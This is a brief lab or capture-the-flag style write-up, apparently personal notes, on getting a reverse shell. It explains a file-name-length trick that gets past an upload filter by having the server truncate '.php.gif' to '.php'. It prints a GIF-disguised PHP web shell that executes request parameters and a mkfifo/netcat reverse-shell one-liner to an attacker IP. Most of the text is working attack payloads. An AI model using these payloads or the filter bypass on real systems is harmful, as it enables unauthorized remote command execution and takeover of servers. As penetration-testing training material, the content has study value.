# Getting a Reverse Shell

### Bypassing the upload filter
Filter has a limite of 232 characteres. Upload a file with 236 with the extensions .php.gif
The Server will filter and shorter the char on name file, removing the .gif

* Upload file and content
```bash
$ cat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif 
GIF8;
<?php system($_REQUEST['kawai']); ?>
```
![[Pasted image 20211126075453.png]]

![[Pasted image 20211126075517.png]]


### Payload for reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 9001 >/tmp/f
```
![[Pasted image 20211126075616.png]]

![[Pasted image 20211126075705.png]]